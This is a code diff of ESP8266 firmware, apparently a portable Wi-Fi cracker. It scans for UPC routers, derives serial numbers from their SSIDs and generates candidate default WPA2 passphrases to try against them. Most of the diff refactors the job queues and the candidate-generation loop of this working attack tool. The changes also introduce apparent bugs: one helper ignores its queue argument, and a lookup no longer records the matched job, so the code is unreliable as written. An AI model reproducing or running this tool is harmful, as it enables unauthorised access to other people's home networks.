@@ -12,6 +12,7 @@
 #include "driver/uart.h"
 #include "user_interface.h"
 
+// structure used for saving/loading scan results to/from user flash
 typedef struct {
     uint8_t bssid[6];
     uint8_t password[8];
@@ -19,6 +20,7 @@ typedef struct {
     uint8_t padding;
 } saved_ap_t;
 
+// structure used for cracking essids, held in running/finished queue
 typedef struct {
     uint32_t target;
     uint8_t *candidate_passwords;
@@ -28,6 +30,7 @@ typedef struct {
     uint64_t start_sum;
 } crack_job_t;
 
+// structure used for scanning essids with reference to running or finished cracking job
 typedef struct {
     char essid[32];
     uint8_t bssid[6];
@@ -35,15 +38,17 @@ typedef struct {
     crack_job_t *job;
 } ap_t;
 
+// AP scanning buffer
 static size_t aps_found;
 static ap_t aps[MAX_APS];
 
-static crack_job_t * running_jobs[MAX_CRACK_JOBS] = {0};
-static crack_job_t * finished_jobs[MAX_SAVED_RESULTS] = {0};
-static size_t jobs_active;
+// 2 queues for managing running/finished cracker jobs
+static crack_job_t * jobs_running_queue[MAX_CRACK_JOBS] = {0};
+static crack_job_t * jobs_finished_queue[MAX_SAVED_RESULTS] = {0};
+static size_t jobs_running;
 static size_t jobs_finished = 0;
-static size_t last_active_job = 0;
-static size_t last_finished_job = 0;
+
+// running counter used by cracking logic
 static uint64_t sum;
 
 #ifdef MODE_HEADLESS
@@ -112,69 +117,84 @@ static volatile os_timer_t blink_timer;
 static uint32_t buf[3] = {0, 0, 0};
 
 ICACHE_FLASH_ATTR
-static void add_cracker_job(crack_job_t *job){
-    printf("Adding cracker job...");
-    size_t job_idx;
-    for(job_idx = 0; job_idx < MAX_CRACK_JOBS; job_idx++){
-        if(!running_jobs[job_idx]){
-            running_jobs[job_idx] = job;
-            job_idx++;
-            printf(" in slot %u", job_idx);
-            jobs_active++;
+static size_t add_queue_job(crack_job_t *job, crack_job_t ** queue, size_t max, size_t *queue_index){
+    size_t job_idx, found_job_idx = -1;
+    for(job_idx = 0; job_idx < max; job_idx++){
+        // find first empty slot
+        if(!queue[job_idx]){
+            queue[job_idx] = job;
+            (*queue_index)++;
+            found_job_idx = job_idx;
             break;
         }
     }
-    if(job_idx > last_active_job){
-        last_active_job = job_idx;
+    return found_job_idx;
+}
+
+ICACHE_FLASH_ATTR
+static size_t delete_queue_job(crack_job_t *job, crack_job_t ** queue, size_t max, size_t *queue_index){
+    size_t job_idx, found_job_idx = -1;
+    if(job){
+        for(job_idx = 0; job_idx < max; job_idx++){
+            // find the job
+            if(jobs_running_queue[job_idx] == job){
+                // swap last in queue with deleted job
+                (*queue_index)--;
+                if(job_idx != *queue_index){
+                    queue[job_idx] = queue[*queue_index];
+                }
+                // zero end of queue
+                queue[*queue_index] = NULL;
+                found_job_idx = job_idx;
+                break;
+            }
+        }
     }
-    job->start_sum = sum;
-    if(last_active_job == 1){
-        // re-start cracker
-        system_os_post(PRIO_CRACK, 0, 0 );
+    return found_job_idx;
+}
+ICACHE_FLASH_ATTR
+static void find_queue_target(crack_job_t ** queue, size_t max, uint32_t target, bool *found){
+    for(size_t i = 0; i < max; i++){
+        if(queue[i] && queue[i]->target == target){
+            *found = true;
+        }
     }
-    printf("/%u\n", last_active_job);
-    if(job_idx == MAX_CRACK_JOBS){
-        printf("Crack jobs list full!\n");
+}
+
+ICACHE_FLASH_ATTR
+static void add_cracker_job(crack_job_t *job){
+    size_t add_idx = add_queue_job(job, jobs_running_queue, MAX_CRACK_JOBS, &jobs_running);
+    if(add_idx != -1){
+        job->start_sum = sum;
+        printf("Adding cracker job... in slot %u/%u\n", add_idx+1, jobs_running);
+        if(jobs_running == 1){
+            // re-start cracker
+            system_os_post(PRIO_CRACK, 0, 0 );
+        }
     }
 }
 
 ICACHE_FLASH_ATTR
 static void delete_cracker_job(crack_job_t *job){
-    size_t jobs_idx;
-    printf("Deleting cracker job...");
-    if(job){
-        for(jobs_idx = 0; jobs_idx < last_active_job; jobs_idx++){
-            if(running_jobs[jobs_idx] == job){
-                printf(" from slot %u", jobs_idx+1);
-                printf("/%u\n", last_active_job);
-                last_active_job--;
-                // re-organise job pointers
-                running_jobs[jobs_idx] = running_jobs[last_active_job];
-                running_jobs[last_active_job] = NULL;
-                jobs_active--;
-                break;
-            }
-        }
+    size_t del_idx = delete_queue_job(job, jobs_running_queue, jobs_running, &jobs_running);
+    if(del_idx != -1){
+        printf("Deleting cracker job... from slot %u/%u\n", del_idx+1, jobs_running+1);
+    }
+}
+
+ICACHE_FLASH_ATTR
+static void add_finished_job(crack_job_t *job){
+    size_t add_idx = add_queue_job(job, jobs_finished_queue, MAX_SAVED_RESULTS, &jobs_finished);
+    if(add_idx != -1){
+        printf("Adding finished cracker job... in slot %u/%u\n", add_idx+1, jobs_finished);
     }
 }
 
 ICACHE_FLASH_ATTR
 static void delete_finished_job(crack_job_t *job){
-    size_t jobs_idx;
-    printf("Deleting finished cracker job...");
-    if(job){
-        for(jobs_idx = 0; jobs_idx < last_finished_job; jobs_idx++){
-            if(finished_jobs[jobs_idx] == job){
-                printf(" from slot %u", jobs_idx+1);
-                printf("/%u\n", last_finished_job);
-                last_finished_job--;
-                // re-organise job pointers
-                finished_jobs[jobs_idx] = finished_jobs[last_finished_job];
-                finished_jobs[last_finished_job] = NULL;
-                jobs_finished--;
-                break;
-            }
-        }
+    size_t del_idx = delete_queue_job(job, jobs_finished_queue, jobs_finished, &jobs_finished);
+    if(del_idx != -1){
+        printf("Deleting finished cracker job... from slot %u/%u\n", del_idx+1, jobs_finished+1);
     }
 }
 
@@ -211,7 +231,7 @@ static void wifi(os_event_t *events){
             }
             size_t aps_targeted = 0;
             size_t i;
-            for(i = 0; i < MAX_APS; i++){
+            for(i = 0; i < aps_found; i++){
                 if(aps[i].job){
                     aps_targeted++;
                 }
@@ -220,7 +240,7 @@ static void wifi(os_event_t *events){
                 }
             }
             /*system_print_meminfo();*/
-            printf("%u new vulnerable, %u target(s) in cache, %u still being cracked, %u bytes free\n", total_aps_pwned, aps_targeted, jobs_active, system_get_free_heap_size());
+            printf("%u new vulnerable, %u target(s) in cache, %u still being cracked, %u bytes free\n", total_aps_pwned, aps_targeted, jobs_running, system_get_free_heap_size());
             state = TARGETING;
             wifi_station_scan(NULL, wifi_scan_cb);
             break;
@@ -339,24 +359,8 @@ static void wifi_scan_cb(void* arg, STATUS status){
                             target += aps[aps_found].essid[i]-0x30;
                         }
                         bool found_target = false;
-                        for(i = 0; i < MAX_CRACK_JOBS; i++){
-                            if(running_jobs[i]){
-                                if(running_jobs[i]->target == target){
-                                    aps[aps_found].job = running_jobs[i];
-                                    found_target = true;
-                                    break;
-                                }
-                            }
-                        }
-                        for(i = 0; i < MAX_SAVED_RESULTS; i++){
-                            if(finished_jobs[i]){
-                                if(finished_jobs[i]->target == target){
-                                    aps[aps_found].job = finished_jobs[i];
-                                    found_target = true;
-                                    break;
-                                }
-                            }
-                        }
+                        find_queue_target(jobs_running_queue, jobs_running, target, &found_target);
+                        find_queue_target(jobs_finished_queue, jobs_finished, target, &found_target);
                         if(!found_target){
                             aps[aps_found].job = (crack_job_t*) os_zalloc(sizeof(crack_job_t));
                             if(aps[aps_found].job){
@@ -394,9 +398,11 @@ static void wifi_scan_cb(void* arg, STATUS status){
         state = CONNECTING;
         global_ap_to_test = ap_to_test;
     } else {
-        if(jobs_active){
-            os_timer_arm(&blink_timer, 1000/jobs_active, 1);
+        if(jobs_running){
+            // blink once per second for 1 ap being cracked, twice for two ap's, etc
+            os_timer_arm(&blink_timer, 1000/jobs_running, 1);
         } else {
+            GPIO_OUTPUT_SET(LED_PIN, LED_OFF);
             os_timer_disarm(&blink_timer);
         }
         state = SCANNING;
@@ -556,51 +562,23 @@ void serial2pass(char* serial, char* pass){
     hash2pass(h2, pass);
 }
 
+#define TESTED_PREFIXES 3
+char *prefix[TESTED_PREFIXES] = {"SAAP", "SAPP", "SBAP"};
+#define PASSWORD_SIZE 8
+
 __attribute((optimize("O3")))
 ICACHE_FLASH_ATTR
 static void crack(os_event_t *events){
-    if(!last_active_job){
-        GPIO_OUTPUT_SET(LED_PIN, LED_OFF);
+    if(!jobs_running){
         return;
     }
-    size_t jobs_idx;
-    crack_job_t *job;
     // inline upc_generate_ssid
-    uint32_t essid_digits = (sum - (((sum * MAGIC2) >> 54) - (sum >> 31)) * 10000000);
-    for(jobs_idx = 0; jobs_idx < last_active_job; jobs_idx++){
-        job = running_jobs[jobs_idx];
-        if(!job){
-            continue;
-        }
-        if (essid_digits != job->target)
-            continue;
-
-        size_t required_size = 8*(job->passwords_found+3);
-        if(job->candidate_passwords){
-            job->candidate_passwords = (char*) os_realloc(job->candidate_passwords, required_size);
-            memset(job->candidate_passwords+(job->passwords_found*8), 0, 3*8);
-        } else {
-            job->candidate_passwords = (char*) os_zalloc(required_size);
-        }
-
-        char *prefix[3] = {"SAAP", "SAPP", "SBAP"};
-        size_t prefix_idx;
-
-        for(prefix_idx = 0; prefix_idx < 3; prefix_idx++){
-            char serial[13] = {0};
-            char *pass = job->candidate_passwords+(8*(job->passwords_found));
-            os_sprintf(serial, "%s%d%03d%04d", prefix[prefix_idx], buf[0], buf[1], buf[2]);
-            serial2pass(serial, pass);
-            //printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
-            job->passwords_found++;
-        }
-    }
-
+    const uint32_t essid_digits = (sum - (((sum * MAGIC2) >> 54) - (sum >> 31)) * 10000000);
     if(++buf[2] == MAX2+1){
         buf[2] = 0;
         if(++buf[1] == (MAX1+1)){
             buf[1] = 0;
-            printf("Cracking %u target(s)... %u/%u\n", jobs_active, buf[0], MAX0);
+            printf("Cracking %u target(s)... %u/%u\n", jobs_running, buf[0], MAX0);
             if(++buf[0] == (MAX0+1)){
                 buf[0] = 0;
             }
@@ -609,14 +587,58 @@ static void crack(os_event_t *events){
     } else {
         sum++;
     }
-    for(jobs_idx = 0; jobs_idx < last_active_job; jobs_idx++){
-        job = running_jobs[jobs_idx];
-        if(job && job->start_sum == sum){
+
+    // check results
+    for(size_t jobs_idx = 0; jobs_idx < jobs_running; jobs_idx++){
+        crack_job_t * restrict const job = jobs_running_queue[jobs_idx];
+        if(!job)
+            continue;
+
+        if(job->start_sum == sum){
             printf("Finished generating passwords for target UPC%07d\n", job->target);
-            delete_cracker_job(job);
             job->finished_cracking = true;
-            finished_jobs[jobs_finished] = job;
-            jobs_finished++;
+            delete_cracker_job(job);
+            add_finished_job(job);
+            continue;
+        }
+
+        if (essid_digits != job->target)
+            continue;
+
+        const size_t required_size = PASSWORD_SIZE*(job->passwords_found+TESTED_PREFIXES);
+        if(job->candidate_passwords){
+            job->candidate_passwords = (char*) os_realloc(job->candidate_passwords, required_size);
+            memset(job->candidate_passwords+(job->passwords_found*PASSWORD_SIZE), 0, TESTED_PREFIXES*PASSWORD_SIZE);
+        } else {
+            job->candidate_passwords = (char*) os_zalloc(required_size);
+        }
+
+        // roll back state
+        uint32_t old_buf[3];
+        memcpy(old_buf, buf, sizeof(old_buf));
+        if(buf[2] == 0){
+            old_buf[2] = MAX2;
+            if(buf[1] == 0){
+                old_buf[1] = MAX1;
+                if(buf[0] == 0){
+                    old_buf[0] = MAX0;
+                } else {
+                    old_buf[0] = buf[0]-1;
+                }
+            } else {
+                old_buf[1] = buf[1]-1;
+            }
+        } else {
+            old_buf[2] = buf[2]-1;
+        }
+
+        for(size_t prefix_idx = 0; prefix_idx < TESTED_PREFIXES; prefix_idx++){
+            char serial[13] = {0};
+            char * pass = job->candidate_passwords+(PASSWORD_SIZE*(job->passwords_found));
+            os_sprintf(serial, "%s%d%03d%04d", prefix[prefix_idx], old_buf[0], old_buf[1], old_buf[2]);
+            serial2pass(serial, pass);
+            //printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
+            job->passwords_found++;
         }
     }
 
